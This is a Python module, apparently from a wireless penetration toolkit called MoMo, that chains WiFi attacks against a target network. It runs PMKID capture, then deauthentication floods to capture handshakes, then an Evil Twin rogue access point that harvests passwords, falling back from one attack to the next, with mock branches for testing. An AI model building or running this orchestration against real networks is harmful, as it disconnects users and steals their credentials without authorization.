"""
MoMo Auto-Pwn Attack Chain.

Provides sequential attack execution with fallback strategies.
"""

import asyncio
import logging
from abc import ABC, abstractmethod
from collections.abc import Awaitable, Callable
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum, auto
from typing import Any

from momo.infrastructure.autopwn.target import Target, TargetType

logger = logging.getLogger(__name__)


class AttackType(Enum):
    """Types of attacks."""
    # WiFi Attacks
    PMKID = auto()              # PMKID grab (clientless)
    DEAUTH_HANDSHAKE = auto()   # Deauth + handshake capture
    EVIL_TWIN = auto()          # Rogue AP + captive portal
    KARMA = auto()              # Karma/MANA attack
    WPA3_DOWNGRADE = auto()     # WPA3 downgrade attack
    
    # BLE Attacks
    BLE_ENUM = auto()           # BLE service enumeration
    BLE_SNIFF = auto()          # BLE traffic sniffing
    
    # Post-Capture
    CRACK_LOCAL = auto()        # Local John cracking
    CRACK_CLOUD = auto()        # Cloud GPU cracking


class AttackStatus(Enum):
    """Attack execution status."""
    PENDING = auto()
    RUNNING = auto()
    SUCCESS = auto()
    FAILED = auto()
    SKIPPED = auto()
    TIMEOUT = auto()


@dataclass
class AttackResult:
    """Result of an attack attempt."""
    attack_type: AttackType
    status: AttackStatus
    target_id: str
    
    # Timing
    started_at: datetime = field(default_factory=datetime.now)
    completed_at: datetime | None = None
    duration_seconds: float = 0.0
    
    # Results
    success: bool = False
    capture_file: str | None = None
    credential: str | None = None
    error: str | None = None
    
    # Metadata
    details: dict[str, Any] = field(default_factory=dict)
    
    def complete(self, success: bool, error: str | None = None) -> None:
        """Mark attack as complete."""
        self.completed_at = datetime.now()
        self.success = success
        self.error = error
        self.status = AttackStatus.SUCCESS if success else AttackStatus.FAILED
        self.duration_seconds = (
            self.completed_at - self.started_at
        ).total_seconds()


class Attack(ABC):
    """Base class for attack implementations."""
    
    attack_type: AttackType
    name: str
    description: str
    
    # Requirements
    requires_client: bool = False      # Needs active client
    requires_handshake: bool = False   # Needs prior handshake
    supports_wpa3: bool = False        # Works on WPA3
    
    # Timing
    default_timeout: float = 60.0      # Seconds
    
    def __init__(self):
        self._running = False
        self._cancelled = False
    
    @abstractmethod
    async def execute(
        self,
        target: Target,
        timeout: float | None = None,
    ) -> AttackResult:
        """Execute the attack against target."""
        pass
    
    async def cancel(self) -> None:
        """Cancel the running attack."""
        self._cancelled = True
    
    def can_attack(self, target: Target) -> tuple[bool, str]:
        """Check if this attack can be used on target."""
        # Check WPA3 support
        if target.is_wpa3 and not self.supports_wpa3:
            return False, "WPA3 not supported"
        
        # Check client requirement
        if self.requires_client and not target.has_active_clients:
            return False, "No active clients"
        
        # Check if already tried and failed
        if self.attack_type.name in target.failed_attacks:
            return False, "Already failed"
        
        return True, ""


class PMKIDAttack(Attack):
    """
    PMKID capture attack.
    
    Clientless attack that grabs PMKID from AP's first EAPOL message.
    Works on WPA2-PSK and some WPA3-SAE networks.
    """
    
    attack_type = AttackType.PMKID
    name = "PMKID Capture"
    description = "Capture PMKID from AP (no client needed)"
    requires_client = False
    supports_wpa3 = False  # WPA3-SAE uses different handshake
    default_timeout = 30.0
    
    def __init__(self, capture_manager: Any = None):
        super().__init__()
        self._capture_manager = capture_manager
    
    async def execute(
        self,
        target: Target,
        timeout: float | None = None,
    ) -> AttackResult:
        """Execute PMKID capture."""
        timeout = timeout or self.default_timeout
        result = AttackResult(
            attack_type=self.attack_type,
            status=AttackStatus.RUNNING,
            target_id=target.id,
        )
        
        logger.info(f"Starting PMKID attack on {target.ssid} ({target.bssid})")
        
        try:
            self._running = True
            self._cancelled = False
            
            if self._capture_manager:
                # Real implementation
                capture_result = await asyncio.wait_for(
                    self._capture_manager.capture_pmkid(
                        bssid=target.bssid,
                        channel=target.channel,
                    ),
                    timeout=timeout,
                )
                
                if capture_result and capture_result.get("pmkid"):
                    result.success = True
                    result.capture_file = capture_result.get("file")
                    result.details["pmkid"] = capture_result.get("pmkid")
                    logger.info(f"PMKID captured for {target.ssid}")
                else:
                    result.success = False
                    result.error = "No PMKID in response"
            else:
                # Mock implementation for testing
                await asyncio.sleep(2.0)
                
                # Simulate 40% success rate
                import random
                if random.random() < 0.4:
                    result.success = True
                    result.capture_file = f"/tmp/{target.bssid}.pmkid"
                    result.details["pmkid"] = "mock_pmkid_hash"
                else:
                    result.success = False
                    result.error = "AP does not support PMKID"
            
        except asyncio.TimeoutError:
            result.status = AttackStatus.TIMEOUT
            result.error = f"Timeout after {timeout}s"
            
        except asyncio.CancelledError:
            result.status = AttackStatus.SKIPPED
            result.error = "Cancelled"
            
        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error = str(e)
            logger.error(f"PMKID attack error: {e}")
        
        finally:
            self._running = False
            result.complete(result.success, result.error)
        
        return result


class DeauthHandshakeAttack(Attack):
    """
    Deauth + Handshake capture attack.
    
    Sends deauth frames to force client reconnection,
    then captures the WPA handshake.
    """
    
    attack_type = AttackType.DEAUTH_HANDSHAKE
    name = "Deauth + Handshake"
    description = "Force reconnection and capture handshake"
    requires_client = True
    supports_wpa3 = False
    default_timeout = 120.0
    
    def __init__(
        self,
        capture_manager: Any = None,
        deauth_count: int = 5,
        deauth_interval: float = 2.0,
    ):
        super().__init__()
        self._capture_manager = capture_manager
        self._deauth_count = deauth_count
        self._deauth_interval = deauth_interval
    
    async def execute(
        self,
        target: Target,
        timeout: float | None = None,
    ) -> AttackResult:
        """Execute deauth + handshake capture."""
        timeout = timeout or self.default_timeout
        result = AttackResult(
            attack_type=self.attack_type,
            status=AttackStatus.RUNNING,
            target_id=target.id,
        )
        
        logger.info(
            f"Starting deauth attack on {target.ssid} "
            f"({len(target.active_clients)} clients)"
        )
        
        try:
            self._running = True
            self._cancelled = False
            
            if self._capture_manager:
                # Start capture
                await self._capture_manager.start_capture(
                    bssid=target.bssid,
                    channel=target.channel,
                )
                
                # Send deauths
                for client in target.active_clients[:3]:  # Max 3 clients
                    for _ in range(self._deauth_count):
                        if self._cancelled:
                            break
                        await self._capture_manager.send_deauth(
                            bssid=target.bssid,
                            client=client,
                        )
                        await asyncio.sleep(self._deauth_interval)
                
                # Wait for handshake
                capture_result = await asyncio.wait_for(
                    self._capture_manager.wait_handshake(target.bssid),
                    timeout=timeout - 30,
                )
                
                if capture_result and capture_result.get("handshake"):
                    result.success = True
                    result.capture_file = capture_result.get("file")
                    logger.info(f"Handshake captured for {target.ssid}")
                else:
                    result.success = False
                    result.error = "No handshake captured"
                    
            else:
                # Mock implementation
                await asyncio.sleep(5.0)
                
                import random
                if random.random() < 0.6:  # 60% success if has clients
                    result.success = True
                    result.capture_file = f"/tmp/{target.bssid}.cap"
                else:
                    result.success = False
                    result.error = "Client did not reconnect"
            
        except asyncio.TimeoutError:
            result.status = AttackStatus.TIMEOUT
            result.error = f"Timeout after {timeout}s"
            
        except asyncio.CancelledError:
            result.status = AttackStatus.SKIPPED
            result.error = "Cancelled"
            
        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error = str(e)
            logger.error(f"Deauth attack error: {e}")
        
        finally:
            self._running = False
            if self._capture_manager:
                await self._capture_manager.stop_capture()
            result.complete(result.success, result.error)
        
        return result


class EvilTwinAttack(Attack):
    """
    Evil Twin attack with captive portal.
    
    Creates a rogue AP mimicking target, with captive portal
    to harvest credentials.
    """
    
    attack_type = AttackType.EVIL_TWIN
    name = "Evil Twin"
    description = "Rogue AP with credential harvesting"
    requires_client = False
    supports_wpa3 = True  # Works by creating open/WPA2 network
    default_timeout = 300.0  # 5 minutes
    
    def __init__(self, eviltwin_manager: Any = None):
        super().__init__()
        self._eviltwin_manager = eviltwin_manager
    
    async def execute(
        self,
        target: Target,
        timeout: float | None = None,
    ) -> AttackResult:
        """Execute Evil Twin attack."""
        timeout = timeout or self.default_timeout
        result = AttackResult(
            attack_type=self.attack_type,
            status=AttackStatus.RUNNING,
            target_id=target.id,
        )
        
        logger.info(f"Starting Evil Twin attack on {target.ssid}")
        
        try:
            self._running = True
            
            if self._eviltwin_manager:
                # Start Evil Twin
                await self._eviltwin_manager.start(
                    ssid=target.ssid,
                    channel=target.channel,
                )
                
                # Wait for credentials
                cred_result = await asyncio.wait_for(
                    self._eviltwin_manager.wait_credential(),
                    timeout=timeout,
                )
                
                if cred_result:
                    result.success = True
                    result.credential = cred_result.get("password")
                    result.details["username"] = cred_result.get("username")
                    logger.info(f"Credential captured for {target.ssid}")
                else:
                    result.success = False
                    result.error = "No credential captured"
            else:
                # Mock - Evil Twin usually runs longer
                await asyncio.sleep(10.0)
                result.success = False
                result.error = "No victims connected"
            
        except asyncio.TimeoutError:
            result.status = AttackStatus.TIMEOUT
            result.error = f"Timeout after {timeout}s"
            
        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error = str(e)
        
        finally:
            self._running = False
            if self._eviltwin_manager:
                await self._eviltwin_manager.stop()
            result.complete(result.success, result.error)
        
        return result


@dataclass
class AttackChainConfig:
    """Configuration for attack chain."""
    # Attack order (first to last)
    attack_order: list[AttackType] = field(default_factory=lambda: [
        AttackType.PMKID,
        AttackType.DEAUTH_HANDSHAKE,
        AttackType.EVIL_TWIN,
    ])
    
    # Timing
    attack_timeout: float = 120.0
    delay_between_attacks: float = 5.0
    
    # Behavior
    stop_on_success: bool = True
    retry_failed: bool = False
    max_retries: int = 1


class AttackChain:
    """
    Manages sequential attack execution.
    
    Tries attacks in order until one succeeds or all fail.
    Supports fallback strategies and parallel attacks.
    """
    
    def __init__(
        self,
        config: AttackChainConfig | None = None,
        capture_manager: Any = None,
        eviltwin_manager: Any = None,
    ):
        self.config = config or AttackChainConfig()
        
        # Initialize attacks
        self._attacks: dict[AttackType, Attack] = {
            AttackType.PMKID: PMKIDAttack(capture_manager),
            AttackType.DEAUTH_HANDSHAKE: DeauthHandshakeAttack(capture_manager),
            AttackType.EVIL_TWIN: EvilTwinAttack(eviltwin_manager),
        }
        
        self._current_attack: Attack | None = None
        self._results: list[AttackResult] = []
        self._running = False
        
        # Callbacks
        self._on_attack_start: list[Callable[[Attack, Target], Awaitable[None]]] = []
        self._on_attack_complete: list[Callable[[AttackResult], Awaitable[None]]] = []
    
    def on_attack_start(
        self,
        callback: Callable[[Attack, Target], Awaitable[None]],
    ) -> None:
        """Register callback for attack start."""
        self._on_attack_start.append(callback)
    
    def on_attack_complete(
        self,
        callback: Callable[[AttackResult], Awaitable[None]],
    ) -> None:
        """Register callback for attack completion."""
        self._on_attack_complete.append(callback)
    
    async def _notify_start(self, attack: Attack, target: Target) -> None:
        """Notify attack start."""
        for callback in self._on_attack_start:
            try:
                await callback(attack, target)
            except Exception as e:
                logger.error(f"Attack start callback error: {e}")
    
    async def _notify_complete(self, result: AttackResult) -> None:
        """Notify attack completion."""
        for callback in self._on_attack_complete:
            try:
                await callback(result)
            except Exception as e:
                logger.error(f"Attack complete callback error: {e}")
    
    async def execute(self, target: Target) -> list[AttackResult]:
        """
        Execute attack chain against target.
        
        Tries attacks in configured order until success or exhausted.
        """
        self._results = []
        self._running = True
        
        logger.info(f"Starting attack chain on {target.ssid} ({target.bssid})")
        
        for attack_type in self.config.attack_order:
            if not self._running:
                break
            
            attack = self._attacks.get(attack_type)
            if not attack:
                logger.warning(f"Attack type {attack_type} not implemented")
                continue
            
            # Check if attack can be used
            can_attack, reason = attack.can_attack(target)
            if not can_attack:
                logger.debug(f"Skipping {attack.name}: {reason}")
                result = AttackResult(
                    attack_type=attack_type,
                    status=AttackStatus.SKIPPED,
                    target_id=target.id,
                )
                result.error = reason
                self._results.append(result)
                continue
            
            # Execute attack
            self._current_attack = attack
            await self._notify_start(attack, target)
            
            result = await attack.execute(
                target,
                timeout=self.config.attack_timeout,
            )
            
            self._results.append(result)
            await self._notify_complete(result)
            
            # Check result
            if result.success:
                logger.info(f"Attack {attack.name} succeeded on {target.ssid}")
                if self.config.stop_on_success:
                    break
            else:
                logger.info(f"Attack {attack.name} failed: {result.error}")
                target.failed_attacks.append(attack_type.name)
            
            # Delay between attacks
            if self.config.delay_between_attacks > 0:
                await asyncio.sleep(self.config.delay_between_attacks)
        
        self._running = False
        self._current_attack = None
        
        return self._results
    
    async def cancel(self) -> None:
        """Cancel the current attack chain."""
        self._running = False
        if self._current_attack:
            await self._current_attack.cancel()
    
    @property
    def is_running(self) -> bool:
        """Check if chain is running."""
        return self._running
    
    @property
    def results(self) -> list[AttackResult]:
        """Get attack results."""
        return self._results
    
    def get_successful_result(self) -> AttackResult | None:
        """Get first successful result."""
        for result in self._results:
            if result.success:
                return result
        return None

